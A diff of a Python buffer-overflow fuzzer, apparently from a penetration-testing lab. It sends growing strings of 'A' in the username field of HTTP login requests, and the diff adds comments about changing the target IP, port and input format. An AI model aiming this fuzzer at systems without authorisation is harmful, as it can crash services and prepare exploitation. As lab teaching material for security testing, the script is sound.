@@ -11,7 +11,8 @@ while(size < 2000):
  try:                                                                                                                                                                                                                                      
    print "\nSending buffer with %s bytes" % size                                                                                                                                                                                      
    inputBuffer = "A" * size                                                                                                                                                                                                                
-                                                                                                                                                                                                                                           
+   
+   # Change the content variable below to match the expected input of the application that's being tested. This application was expecting a username and password.
    content = "username=" + inputBuffer + "&password=A"                                                                                                                                                                                     
    buffer = "POST /login HTTP/1.1\r\n"                                                                                                                                                                                                     
    buffer += "Host: 10.11.0.22\r\n"                                                                                                                                                                                                        
@@ -27,6 +28,7 @@ while(size < 2000):
    buffer += content
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
 
+   # Change this IP address and port (80) to the address and port of the application that's being tested.
    s.connect(("192.168.223.10", 80))
    s.send(buffer)
 
